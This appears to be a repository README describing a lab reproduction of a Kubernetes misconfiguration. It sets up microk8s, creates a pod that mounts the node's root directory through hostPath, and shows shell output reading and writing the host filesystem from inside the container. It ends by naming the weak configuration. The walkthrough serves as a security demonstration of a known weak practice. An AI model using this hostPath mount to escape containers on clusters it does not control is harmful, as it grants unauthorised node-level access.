# Kuberentes Hostpath Exploit

This repository just captures instructions for reproducing an misconfiguration in a kubernetes cluster in which hostPath is permitted and can be used to gain access to the underlying node's file system

## Instructions

### Cluster Setup

```bash
$ sudo apt update && sudo apt upgrade -y && sudo apt install docker
$ sudo snap install microk8s --classic
$ sudo usermod -a -G microk8s $USER
$ sudo chown -f -R $USER ~/.kube
$ newgrp microk8s
$ microk8s status --wait-ready
$ microk8s kubectl get nodes
$ microk8s enable dns hostpath-storage
```
### Run the Vulnerble Pod

[hostpathescalation.yaml](hostpathescalation.yaml)

```bash
$ microk8s kubectl create -f hostpathescalation.yaml
```

### Demonstrate Access to Underlying Host Filesystem

```bash
$ microk8s kubectl exec -it test -- sh
/ # ls /test
bin         cdrom       etc         lib         lib64       lost+found  mnt         proc        run         snap        sys         usr
boot        dev         home        lib32       libx32      media       opt         root        sbin        srv         tmp         var
/test # touch blah.txt
/test # ls
bin         boot        dev         home        lib32       libx32      media       opt         root        sbin        srv         tmp         var
blah.txt    cdrom       etc         lib         lib64       lost+found  mnt         proc        run         snap        sys         usr
/test # rm blah.txt
```

## Weak Practice

- Allowing hostpath storage

```bash
$ microk8s enable hostpath-storage
```

```yaml
    volumeMounts:
    - name: myvol
      mountPath: /test
...
  - name: myvol
    hostPath:
      path: /
```
